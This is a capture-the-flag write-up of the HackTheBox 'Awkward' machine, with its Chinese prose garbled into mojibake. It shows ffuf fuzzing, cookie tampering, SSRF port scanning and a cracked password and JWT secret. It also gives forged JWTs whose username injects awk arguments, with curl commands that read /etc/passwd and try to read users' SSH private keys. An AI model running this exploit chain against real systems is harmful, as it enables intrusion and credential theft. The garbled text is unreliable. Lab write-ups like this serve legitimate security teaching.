é¡µé¢æŒ‡å‘åŸŸå `hat-valley.htb` ï¼Œå»åšä¸€ä¸ª hosts è§£æ\n\n```bash\necho 10.10.11.185 hat-valley.htb >> /etc/hosts\n```\n![](Hackthebox-Awkward/s2ADAkE-yRjmVY6jcJUpfrNgAeL5baPuLooeftSi52s.png)\n\nä¼¼ä¹æ˜¯ä¸€ä¸ªä»€ä¹ˆå•†åŸä¹‹ç±»çš„ï¼Œåšæ‰¾ä¸‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ç”¨ä¿¡æ¯\n\n## Fuzz\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ffuf -u \"http://hat-valley.htb/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200  \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://hat-valley.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 200\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\ncss                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 404ms]\nstatic                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 386ms]\njs                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 356ms]\n                        [Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 98ms]\n:: Progress: [30000/30000] :: Job [1/1] :: 743 req/sec :: Duration: [0:00:54] :: Errors: 2 ::\n```\nè·‘äº†ä¸€ä¸‹ç›®å½•ï¼Œæ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œå»è·‘ä¸€ä¸‹å­åŸŸå\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ffuf -H \"Host:FUZZ.hat-valley.htb\" -w \"/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\" -u \"http://hat-valley.htb/\" -t 200 -fs 132\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://hat-valley.htb/\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n :: Header           : Host: FUZZ.hat-valley.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 200\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n :: Filter           : Response size: 132\n________________________________________________\n\nstore                   [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 76ms]\n:: Progress: [114441/114441] :: Job [1/1] :: 2296 req/sec :: Duration: [0:00:49] :: Errors: 0 ::\n```\nå‘ç°ä¸€ä¸ªå­åŸŸå `store` ï¼Œå»åŠ å…¥ä¸€ä¸‹ hosts è§£æ\n\n```bash\necho 10.10.11.185 store.hat-valley.htb >> /etc/hosts\n```\nç„¶åå»è®¿é—®ä¸€ä¸‹\n\n![](Hackthebox-Awkward/8a9z15RXHkRXEcsxx7byXob8h1cSMJkFUQwb6KqyfMU.png)\n\næç¤ºéœ€è¦ç™»å½•ï¼Œå°è¯•äº†ä¸€ä¸‹å¼±å£ä»¤æ²¡æœ‰æˆåŠŸï¼Œå¹¶ä¸” fuzz äº†ä¸€ä¸‹ä¹Ÿæ²¡æœ‰å¯ä»¥è®¿é—®çš„åœ°å€ï¼Œéƒ½æ˜¯ 401\n\næŠŠç›®å…‰æ”¾å›åˆ°ä¸»é¡µé¢ï¼Œæˆ‘ä»¬ç»§ç»­ fuzz ä¸‹å»\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ffuf -u \"http://hat-valley.htb/js/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 -e .js\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://hat-valley.htb/js/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n :: Extensions       : .js \n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 200\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\napp                     [Status: 200, Size: 150, Words: 6, Lines: 1, Duration: 267ms]\napp.js                  [Status: 200, Size: 430202, Words: 15339, Lines: 1640, Duration: 175ms]\ncustom.js               [Status: 200, Size: 8618, Words: 865, Lines: 370, Duration: 135ms]\ncustom                  [Status: 200, Size: 153, Words: 6, Lines: 1, Duration: 230ms]\nplugin                  [Status: 200, Size: 153, Words: 6, Lines: 1, Duration: 240ms]\nplugin.js               [Status: 200, Size: 899759, Words: 60565, Lines: 18950, Duration: 135ms]\n                        [Status: 200, Size: 14351, Words: 1661, Lines: 366, Duration: 575ms]\nrevolution              [Status: 301, Size: 193, Words: 7, Lines: 11, Duration: 286ms]\n:: Progress: [60000/60000] :: Job [1/1] :: 564 req/sec :: Duration: [0:01:46] :: Errors: 4 ::\n```\n![](Hackthebox-Awkward/j5ZGICk1xYW72GWIQs9WnRghOrrqRS_ATcJVBEXuwMg.png)\n\nåœ¨ `app.js` ä¸­æ‰¾åˆ°äº†ä¸€ä¸ªæŒ‡å‘ hr çš„åœ°å€ï¼Œå»è®¿é—®ä¸€ä¸‹\n\nâ€ƒ\n\n![](Hackthebox-Awkward/-BwOtHLOeLyy50Rv5iKDsejC7_bYKTE258Yoh3yXcjs.png)\n\næœ‰ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œä½†æµ‹è¯•äº†ä¸€ä¸‹å¼±å£ä»¤æ²¡æˆåŠŸ\n\n# æ¼æ´åˆ©ç”¨\n## å¯»æ‰¾çªç ´ç‚¹\n![](Hackthebox-Awkward/2u8cLEOiKzUpbjL_JAEHrS-gZ-PKZChX3CVaV-JbKig.png)\n\næŸ¥çœ‹ `Cookie` ä¸­ï¼Œå‘ç°æœ‰ä¸€ä¸ª token å€¼æ˜¯ guestï¼Œç»™å®ƒæ”¹æˆ admin è¯•è¯•\n\n![](Hackthebox-Awkward/ltD-Te3zqjpYgYmBKiGzgU1UxmuwnkAvXvRO9S3V6tc.png)\n\nå°±ç›´æ¥ç™»å½•äº†\n\n![](Hackthebox-Awkward/n6XAUDBfSXnWrAT3xXtmUS2Dfs8mH6pZDgI5PHA6eSQ.png)\n\nè¿™é‡Œæœ‰ä¸ªè¯·å‡ç”³è¯·ï¼Œä½†æ˜¯ç‚¹äº†æ²¡æœ‰ååº”ï¼ŸæŠ“ä¸ªåŒ…çœ‹çœ‹\n\n![](Hackthebox-Awkward/6Ju9QTts9sHbU-d1k6BNxqv-Bx6ONQg0Gp7nZOWamww.png)\n\nç›´æ¥ 500 äº†\n\n![](Hackthebox-Awkward/FIn97059GEfYnGZ1ys0rVr1COWAiVNZxrclWJ9C5WIw.png)\n\nåœ¨è¿™é‡Œå‘ç°äº†ä¸¤ä¸ªæ¥å£\n\n```bash\napi/store-status\napi/staff-details\n```\nåˆ†åˆ«å»è®¿é—®ä¸€ä¸‹å‘¢\n\n![](Hackthebox-Awkward/fUgz-Z8M1YDOGCsVCt4yemb1NpaLxhb3NcSA-6MQwPg.png)\n\nä¼¼ä¹æ˜¯ JWT ä»¤ç‰Œçš„é—®é¢˜ï¼Œè€Œ JWT ä»¤ç‰Œæ˜¯å¿…é¡»ç™»å½•åæ‰æœ‰çš„ï¼Œä½†æˆ‘ä»¬ç°åœ¨æ˜¯é€šè¿‡æœªæˆæƒè®¿é—®ï¼ˆè¿˜æ˜¯è¶Šæƒï¼Ÿï¼‰æ¥è¿›è¡Œç™»å½•çš„ï¼Œæ‰€ä»¥æ²¡æœ‰ JWT ä»¤ç‰Œã€‚\n\næ‰€ä»¥æˆ‘ä»¬ç°åœ¨å»é€€å‡ºç™»å½•å†è®¿é—®è¿™ä¸ªé¡µé¢è¯•è¯•çœ‹\n\n![](Hackthebox-Awkward/vVvVIC59OQRwu_OeVmjihwsU4UpheMSBBQ3os-Cg5Hg.png)\n\næˆ‘å‘ç°æˆ‘çš„æ€è·¯é”™äº†ï¼Œé€€å‡ºç™»å½•åè¿˜æ˜¯å›æœ‰ä¸€ä¸ª cookieï¼Œæ‰€ä»¥ç›´æ¥åˆ é™¤ cookie è¯•è¯•\n\n![](Hackthebox-Awkward/qrKPSzIAFIgZWKvg-OHYNqJK-WCQLk_nBrbKOINZ5PY.png)\n\næ‰€ä»¥æˆ‘ä»¬ç›´æ¥å¾—åˆ°äº†ä¸€äº›è´¦å·å¯†ç \n\nä½¿ç”¨ `crack station` æ¥è¿›è¡Œç ´è§£\n\n> [https://crackstation.net/](https://crackstation.net/)\n\n![](Hackthebox-Awkward/ylHHETQieALkMiXqdgHvo8oAq3Pwjvvno11gripTPq4.png)\n\nå¾—åˆ°äº†ä¸€ä¸ªè´¦å·å¯†ç \n\n```bash\nusername = christopher.jones\npassword = chris123\n```\nç„¶åæˆ‘ä»¬å» hr é¡µé¢ç™»å½•\n\n![](Hackthebox-Awkward/iy3HWs9a4ANUgIHySTW6s603YQwChIlf9o5tAOPSnZw.png)\n\nç™»å½•æˆåŠŸ\n\n![](Hackthebox-Awkward/UGyOtuz4HOOqc5TxSzfJY7Zlp_qTt6Mkfho1iWsC82g.png)\n\nç„¶åæˆ‘ä»¬æ‹¿åˆ°äº† JWT Token\n\n```bash\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc4NTUxNDU3fQ.Baca0KhSUCTjcZiDINY0mVs1Tndg78RGwXWLMpwjuZ8\n```\n![](Hackthebox-Awkward/-zPUOYKcPXLNRS_SkEg4RrApECQwKWUV_1UK4IPu2E0.png)\n\nä½¿ç”¨ `jwt.io` è®¿é—®ï¼Œå¯ä»¥çœ‹åˆ°å†…å®¹ç›¸å½“çš„ç®€å•\n\nä½†æ˜¯æˆ‘åœ¨å››ä¸ªç”¨æˆ·åˆ—è¡¨ä¸­æ²¡æœ‰çœ‹åˆ°ä»€ä¹ˆæ˜æ˜¾çš„æ˜¯ç®¡ç†å‘˜çš„ä¸œè¥¿\n\nä¸è¿‡ `Christine Wool` ä¼¼ä¹æ˜¯ CEOï¼Œä½†æ˜¯ JWT ä»¤ç‰Œä¼ªé€ æ¯”è¾ƒéº»çƒ¦ï¼Œè€Œä¸”æˆ‘çœ‹äº†ä¸‹é¶åœºç±»å‹ï¼Œåå‘äº `Custom Exploitation` ï¼Œè¿™çœ‹ç€å¾ˆåƒæ˜¯å…”å­æ´\n\næ‰€ä»¥æˆ‘ä»¬æ¢ä¸ªæ€è·¯\n\n![](Hackthebox-Awkward/ixq6hoCufvKYUC1ZW2TOsW58PWVDMYs-0sLM54nKVnI.png)\n\næ¥åˆ°é¦–é¡µï¼Œæˆ‘ä»¬ç‚¹å‡»åˆ·æ–°ï¼ŒæŠ“è¿™ä¸ªåˆ·æ–°çš„åŒ…çœ‹çœ‹\n\n![](Hackthebox-Awkward/hVWqIl5JU58WsJDCmMGnTEQBDnXqClV-TitZyXNEje4.png)\n\nè¯·æ±‚çš„åŒ…æœ‰ç‚¹å¥‡æ€ª\n\nè¿™ä¸ªåŒ…æŒ‡å‘äº†å­åŸŸå store\n\n![](Hackthebox-Awkward/jv_20INiPgVbrlp3FRYyZHwtklfwxugK227WvxWMbUo.png)\n\nokï¼Œè¿™å¾ˆæ˜æ˜¾æ˜¯ä¸€ä¸ª SSRF äº†ï¼Œæˆ‘ä»¬æ¥ fuzz ä¸€ä¸‹\n\n## Fuzz\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ffuf -u 'http://hat-valley.htb/api/store-status?url=\"http://localhost:FUZZ\"' -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -fs 0 \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://hat-valley.htb/api/store-status?url=\"http://localhost:FUZZ\"\n :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n :: Filter           : Response size: 0\n________________________________________________\n\n0080                    [Status: 200, Size: 132, Words: 6, Lines: 9, Duration: 290ms]\n3002                    [Status: 200, Size: 77010, Words: 5916, Lines: 686, Duration: 142ms]\n8080                    [Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 170ms]\n:: Progress: [10000/10000] :: Job [1/1] :: 193 req/sec :: Duration: [0:00:49] :: Errors: 0 ::\n```\nè¿™é‡Œçš„ 3002 å’Œ 8080 éƒ½æ˜¯æˆ‘ä»¬æ²¡æœ‰è§è¿‡çš„ï¼Œæ¯”è¾ƒå¥‡æ€ªçš„ï¼Œå¹¶ä¸”æœ‰ä¸œè¥¿çš„\n\nè€Œ 3002 çš„ size å±…ç„¶æœ‰ 77010 ä¸ªï¼Œæ˜æ˜¾ä¸å¯¹ï¼Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹\n\n![](Hackthebox-Awkward/qV0Ue07IjR14am1u1aKIIooiBFkQY5uO1Ky1qX4IM74.png)\n\nç›´æ¥è®¿é—®æ˜¯ç©ºç™½çš„ï¼Œæˆ‘ä»¬åŠ ä¸ŠåŒå¼•å·è¯•è¯•\n\n![](Hackthebox-Awkward/3lmX3BPWnjKtiD3MSe1h-dHJdJBJhjopXczCaJ9CpP0.png)\n\nniceï¼Œæœ‰ä¸œè¥¿äº†\n\n![](Hackthebox-Awkward/RQJrPbAxTdvycj6hIf0wvnvPePy5ArRrraGZyR0fXgk.png)\n\nå‘ç°ä¸ªæœ‰è¶£çš„ç©æ„å„¿ï¼Œæ£€ç´¢å·²ç™»å½•ç”¨æˆ·çš„ä¼‘å‡è¯·æ±‚å†å²è®°å½•ï¼Œè¿™ä¸ªæ¥å£æ˜¯æœ‰ LFI çš„ã€‚\n\n![](Hackthebox-Awkward/Cyc38LvM7oUkPlO17iHJS4Lv2kdGKa64EO8odaxI2ig.png)\n\n## JWT Token åˆ©ç”¨\nè¿™é‡Œçš„ awk å‘½ä»¤æ˜¯ä¼ é€’ç”¨æˆ·å˜é‡çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶å®ƒæ¥è¾¾åˆ°åˆ©ç”¨çš„ç›®çš„\n\næˆ‘ä»¬éœ€è¦å°†ç”¨æˆ·å˜é‡æ›´æ”¹ä¸º `/etc/passwd` \n\nuser å˜é‡çš„å€¼æ˜¯ JWT ä»¤ç‰Œçš„ç”¨æˆ·åï¼Œä¸ºäº†è®©å®ƒæˆåŠŸåˆ©ç”¨ï¼Œæˆ‘ä»¬å…ˆå»æ‹¿åˆ° JWT Token çš„å¯†é’¥\n\né¦–å…ˆå°† token ä¿å­˜åˆ°æœ¬åœ°\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# cat jwt                                                                           \neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc4NTUxNDU3fQ.Baca0KhSUCTjcZiDINY0mVs1Tndg78RGwXWLMpwjuZ8\n```\nç„¶åä½¿ç”¨ john è¿›è¡Œç ´è§£\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# john jwt --wordlist=/usr/share/wordlists/rockyou.txt -format=HMAC-SHA256 \nUsing default input encoding: UTF-8\nLoaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 AVX 4x])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n123beany123      (?)     \n1g 0:00:00:03 DONE (2023-03-12 00:54) 0.3076g/s 4102Kp/s 4102Kc/s 4102KC/s 123erix..123P45\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n```\nå¾—åˆ°äº†å¯†é’¥\n\nç„¶åæˆ‘ä»¬å» jwt.io è¿›è¡Œ cookie çš„ä¼ªé€ \n\n![](Hackthebox-Awkward/9K65eo5piospxqpwE42bSLhIb46aQiunURAzYsVPRJA.png)\n\nå¾—åˆ°äº†  cookie\n\n```bash\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzg1NTE0NTd9.4WKtKGFVSVXt2mD7ZJyxyclmMKFe-lHklgj4QVzBtZk\n```\nç„¶åæˆ‘ä»¬ç”¨ burp æŠ“åŒ…ä¸€ä¸ªè®¿é—® /api/all-leave çš„è¯·æ±‚ï¼Œç„¶åæŠŠ cookie æ›¿æ¢ä¸ºæˆ‘ä»¬åˆ¶ä½œçš„\n\n![](Hackthebox-Awkward/h7OqA_sXJdmZFBxNvhn15FAHKB7GAVPPOjzzh2sBNQ0.png)\n\næˆåŠŸåˆ©ç”¨\n\næˆ‘è¿™ä¸ªäººæ¯”è¾ƒæ‡’ï¼Œæ‰€ä»¥ç°åœ¨æˆ‘ä»¬æ¥æ„é€ ä¸€ä¸‹å‘½ä»¤è¡Œçš„\n\n```bash\ncurl http://hat-valley.htb/api/all-leave --header \"cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzg1NTE0NTd9.4WKtKGFVSVXt2mD7ZJyxyclmMKFe-lHklgj4QVzBtZk\"\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# curl http://hat-valley.htb/api/all-leave --header \"cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzg1NTE0NTd9.4WKtKGFVSVXt2mD7ZJyxyclmMKFe-lHklgj4QVzBtZk\"\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:102:105::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsyslog:x:104:111::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:115::/run/uuidd:/usr/sbin/nologin\nsystemd-oom:x:108:116:systemd Userspace OOM Killer,,,:/run/systemd:/usr/sbin/nologin\ntcpdump:x:109:117::/nonexistent:/usr/sbin/nologin\navahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\ndnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\nkernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin\navahi:x:114:121:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin\ncups-pk-helper:x:115:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin\nrtkit:x:116:123:RealtimeKit,,,:/proc:/usr/sbin/nologin\nwhoopsie:x:117:124::/nonexistent:/bin/false\nsssd:x:118:125:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin\nspeech-dispatcher:x:119:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false\nnm-openvpn:x:120:126:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin\nsaned:x:121:128::/var/lib/saned:/usr/sbin/nologin\ncolord:x:122:129:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\ngeoclue:x:123:130::/var/lib/geoclue:/usr/sbin/nologin\npulse:x:124:131:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin\ngnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false\nhplip:x:126:7:HPLIP system user,,,:/run/hplip:/bin/false\ngdm:x:127:133:Gnome Display Manager:/var/lib/gdm3:/bin/false\nbean:x:1001:1001:,,,:/home/bean:/bin/bash\nchristine:x:1002:1002:,,,:/home/christine:/bin/bash\npostfix:x:128:136::/var/spool/postfix:/usr/sbin/nologin\nmysql:x:129:138:MySQL Server,,,:/nonexistent:/bin/false\nsshd:x:130:65534::/run/sshd:/usr/sbin/nologin\n_laurel:x:999:999::/var/log/laurel:/bin/false\n```\nåˆ©ç”¨æˆåŠŸï¼Œç°åœ¨æˆ‘ä»¬æ¥ç­›é€‰ä¸€ä¸‹å“ªäº›ç”¨æˆ·å¯ä»¥è¢«æˆ‘ä»¬åˆ©ç”¨\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# curl http://hat-valley.htb/api/all-leave --header \"cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzg1NTE0NTd9.4WKtKGFVSVXt2mD7ZJyxyclmMKFe-lHklgj4QVzBtZk\"|grep bash\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  3059  100  3059    0     0  11835      0 --:--:-- --:--:-- --:--:-- 11856\nroot:x:0:0:root:/root:/bin/bash\nbean:x:1001:1001:,,,:/home/bean:/bin/bash\nchristine:x:1002:1002:,,,:/home/christine:/bin/bash\n```\nå¯ä»¥è¢«æˆ‘ä»¬åˆ©ç”¨çš„æœ‰ä¸‰ä¸ªï¼Œrootã€beanã€christineï¼Œå¾ˆæ˜æ˜¾ root å¯ä»¥æ’é™¤æ‰ï¼Œé‚£æˆ‘ä»¬æ¥å°è¯•è¯·æ±‚ä¸€ä¸‹å‰©ä¸‹ä¸¤ä¸ªçš„ ssh å¯†é’¥è¯•è¯•\n\n```bash\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLnNzaC9pZF9yc2EgJyIsImlhdCI6MTY3ODU1MTQ1N30.q-l1lOtEZN_v9o2iSq6QtSAa_qy4q820aemxYDMfcKs\n\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2NocmlzdGluZS8uc3NoL2lkX3JzYSAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.MUsm1gjZCMxGU1lJ6D0NRn8X_NAaVF2Mf1oZj0het5A\n```\nå»å°è¯•ä¸€ä¸‹\n\n```bash\ncurl http://hat-valley.htb/api/all-leave --header \"cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLnNzaC9pZF9yc2EgJyIsImlhdCI6MTY3ODU1MTQ1N30.q-l1lOtEZN_v9o2iSq6QtSAa_qy4q820aemxYDMfcKs\"\n\ncurl http://hat-valley.htb/api/all-leave --header \"cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2NocmlzdGluZS8uc3NoL2lkX3JzYSAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.MUsm1gjZCMxGU1lJ6D0NRn8X_NAaVF2Mf1oZj0het5A\"\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# curl http://hat-valley.htb/api/all-leave --header \"cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLnNzaC9pZF9yc2EgJyIsImlhdCI6MTY3ODU1MTQ1N30.q-l1lOtEZN_v9o2iSq6QtSAa_qy4q820aemxYDMfcKs\"\nFailed to retrieve leave requests                                                                                                                                                                                                                   \nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# curl http://hat-valley.htb/api/all-leave --header \"cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2NocmlzdGluZS8uc3NoL2lkX3JzYSAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.MUsm1gjZCMxGU1lJ6D0NRn8X_NAaVF2Mf1oZj0het5A\"\nFailed to retrieve leave requests\n```\néƒ½å¤±è´¥äº†ï¼Œé‚£æˆ‘ä»¬å»è·å–ä¸€ä¸‹ `.bashrc` æ–‡ä»¶è¯•è¯•\n\n```bash\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.qM7H1rC2FK75T8PtsA0FfWpP47D5EIoESKpVnx4e-fg\n\ncurl http://hat-valley.htb/api/all-leave --header \"cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.qM7H1rC2FK75T8PtsA0FfWpP47D5EIoESKpVnx4e-fg\"\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# curl http://hat-valley.htb/api/all-leave --header \"cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.qM7H1rC2FK75T8PtsA0FfWpP47D5EIoESKpVnx4e-fg\"\n# ~/.bashrc: executed by bash(1) for non-login shells.\n# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)\n# for examples\n\n# If not running interactively, don't do anything\ncase $- in\n    *i*) ;;\n      *) return;;\nesac\n\n# don't put duplicate lines or lines starting with space in the history.\n# See bash(1) for more options\nHISTCONTROL=ignoreboth\n\n# append to the history file, don't overwrite it\nshopt -s histappend\n\n# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)\nHISTSIZE=1000\nHISTFILESIZE=2000\n\n# check the window size after each command and, if necessary,\n# update the values of LINES and COLUMNS.\nshopt -s 